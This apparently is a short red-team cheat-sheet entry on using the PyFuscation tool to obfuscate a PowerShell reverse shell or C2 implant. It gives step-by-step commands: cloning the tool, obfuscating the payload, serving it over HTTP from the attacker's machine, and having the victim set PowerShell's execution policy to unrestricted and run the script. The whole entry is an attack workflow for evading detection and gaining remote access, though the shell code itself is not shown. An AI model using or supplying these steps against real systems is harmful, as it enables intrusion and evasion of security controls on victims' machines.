# Pyfuscation

Link: https://github.com/CBHue/PyFuscation

## Steps

#### 1) Clone the repo on our machine

    git clone https://github.com/CBHue/PyFuscation

#### 2) Create a powershell reverse shell or c2 implant with attacker IP and port

#### 3) Obfuscate our powershell with pyfuscation

    python3 Pyfuscation.py -fvp --ps powershellrev.ps1

#### 4) Rename the newly created .ps1 file

#### 5) Serve the file for the victim to download

    sudo python3 -m http.server 80

#### 6) Download, then execute the .ps1 from victim machine

    Set-ExecutionPolicy unrestricted
    .\powershellrevobf.ps1
